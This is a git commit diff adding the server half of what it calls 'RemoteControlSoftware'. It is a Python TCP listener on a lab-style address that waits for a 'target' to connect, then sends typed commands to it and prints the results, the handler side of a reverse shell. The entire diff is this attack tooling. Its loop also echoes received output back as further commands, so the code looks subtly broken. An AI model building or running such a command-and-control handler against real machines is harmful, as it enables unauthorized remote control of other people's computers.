a7903849caae133d6f861a3c35776bd2ef988795
Caius Juvonen <caius@localhost.localdomain>
2021-02-26 04:12:49 +0200

    Added server & client code

--- RemoteControlSoftware/server.py
+++ RemoteControlSoftware/server.py
@@ -2,11 +2,22 @@
 
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("10.0.2.7", 6666))
-listener.listen(0)
-print("[+] Listening for connections")
-listener.accept()
-print("[+] Connection established with target")
+HOST = "10.0.2.7"
+PORT = 6666
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((HOST, PORT))
+    s.listen()
+    print("[+] Listening for connections")
+    conn, addr = s.accept()
+    print("[+] Connection established with target ", addr)
+    while True:
+        command = input(">> ")
+        conn.send(command.encode())
+        data = conn.recv(1024)
+        print(data.decode("utf-8", "ignore"))
+        if not data:
+            break
+        conn.sendall(data)
 
